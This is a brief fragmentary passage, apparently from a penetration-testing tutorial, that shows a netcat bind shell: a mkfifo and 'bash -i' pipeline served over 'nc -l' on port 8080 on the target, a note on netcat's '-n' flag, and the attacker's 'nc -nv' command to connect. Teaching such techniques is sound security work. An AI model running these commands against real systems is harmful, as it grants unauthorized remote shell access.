...
```shell
target@machine~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
...
- `-n` - Disables <span style="color: inherit;">DNS</span> resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
...
```shell
attacker@BoB~$ nc -nv 10.10.13.37 8080 
